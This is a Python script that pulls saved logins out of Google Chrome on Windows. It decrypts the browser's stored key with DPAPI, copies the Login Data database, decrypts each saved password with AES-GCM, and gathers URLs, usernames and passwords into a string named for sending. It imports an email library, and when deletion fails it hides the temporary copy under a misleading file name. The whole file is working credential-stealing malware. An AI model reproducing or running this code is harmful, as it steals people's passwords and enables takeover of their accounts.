import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import platform
from getpass import getuser
import smtplib

from getpass import getuser

content_to_send = ""

def CHROME_PASSWORD_EXTRACTOR(profile="Default", savefname="chromePass_default"):
    
    def get_chrome_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
    
    def main():
        
        global content_to_send
        
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", profile, "Login Data")
        filename = f"{savefname}.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                content_to_send += f"\nOrigin URL: {origin_url}"
                content_to_send += f"\nAction URL: {action_url}"
                content_to_send += f"\nUsername: {username}"
                content_to_send += f"\nPassword: {password}"
            else:
                continue
            if date_created != 86400000000 and date_created:
                content_to_send += f"\nCreation date: {str(get_chrome_datetime(date_created))}"
            if date_last_used != 86400000000 and date_last_used:
                content_to_send += f"\nLast Used: {str(get_chrome_datetime(date_last_used))}"
            content_to_send += "\n\n==================================================\n\n"
        
        cursor.close()
        db.close()
        
        # Removing the temporarily copied .db file with all the data
        try:
            os.remove(filename)
        except:
            try:
                os.system(f'del {filename}')
            except:
                os.system(f'ren "{filename}" "updates.{filename.split(".")[0]}.exe..sql.py.r.cpp.txt.docx.rtf.c.xlsx"')
    
    try:
        main()
    except Exception as e:
        print("Error: ", e)
